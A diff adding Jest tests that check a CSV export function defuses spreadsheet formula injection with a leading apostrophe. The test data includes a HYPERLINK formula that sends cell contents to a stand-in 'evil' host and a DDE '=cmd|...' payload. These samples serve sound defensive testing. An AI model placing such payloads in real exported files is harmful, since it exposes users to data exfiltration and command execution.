@@ -75,6 +75,41 @@ describe('transactionsToCsv (DATA-01 pt-BR export)', () => {
     expect(last.split(';')).toHaveLength((lines[0] as string).split(';').length)
   })
 
+  it('neutralizes spreadsheet formula injection (=,+,-,@,leading TAB) with a leading apostrophe (CR-01)', () => {
+    const triggers = ['=1+1', '=HYPERLINK("http://evil/"&A1)', '+x', '-x', '@SUM(A1)', '\tcmd']
+    for (const description of triggers) {
+      const csv = transactionsToCsv([
+        {
+          occurred_on: '2026-06-01',
+          description,
+          category_name: 'Outros',
+          category_kind: 'consumo',
+          amount_cents: 100,
+        },
+      ])
+      const [, dataRow] = rowsOf(csv) as [string, string]
+      // The Descrição cell (2nd column) starts with the inert `'` guard. The cell may
+      // also be RFC-4180-quoted, so accept either `'…` or `"'…`.
+      const descCell = dataRow.split(';')[1] as string
+      expect(descCell.startsWith("'") || descCell.startsWith('"\'')).toBe(true)
+    }
+  })
+
+  it('also defuses a formula trigger in the user-named category column (CR-01)', () => {
+    const csv = transactionsToCsv([
+      {
+        occurred_on: '2026-06-01',
+        description: 'benigno',
+        category_name: '=cmd|\'/c calc\'!A1',
+        category_kind: 'consumo',
+        amount_cents: 100,
+      },
+    ])
+    const [, dataRow] = rowsOf(csv) as [string, string]
+    const catCell = dataRow.split(';')[2] as string
+    expect(catCell.startsWith("'") || catCell.startsWith('"\'')).toBe(true)
+  })
+
   it('quotes and doubles inner quotes for a field containing ; " or newline (RFC-4180)', () => {
     const csv = transactionsToCsv([
       {
